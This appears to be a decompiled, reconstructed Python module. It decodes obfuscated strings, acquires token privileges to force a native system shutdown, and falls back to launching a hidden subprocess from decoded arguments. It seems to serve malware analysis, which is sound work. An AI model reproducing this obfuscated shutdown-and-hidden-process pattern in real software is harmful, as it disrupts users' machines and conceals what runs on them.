"""Recovered zero-argument entry ``yb_p7_go``.

Decompiled structure: token-privilege setup followed by a hidden
``subprocess.Popen`` whose argv is two decoded fragments plus a dynamic
line segment.
"""
from __future__ import annotations

from ..link._fds_jm import sec
from . import _ops


def yb_p7_go() -> None:
    _priv = sec("fg_vn_9c")
    _dll_a = sec("gh_wo_4r")
    _dll_k = sec("hi_xp_7m")
    _api = sec("kl_as_6v")
    _primed = _ops.shutdown_native(
        _dll_a,
        _dll_k,
        _priv,
        _dll_a,
        _api,
        (None, None, 0, True, True, 0),
    )
    if not _primed:
        _sp = sec("lm_bt_1d")
        _line = sec("mn_cu_8f")
        _args = sec("zp_uq_6n") + sec("hm_xd_3k")
        _ops.hidden_popen((_sp, _line, _args))

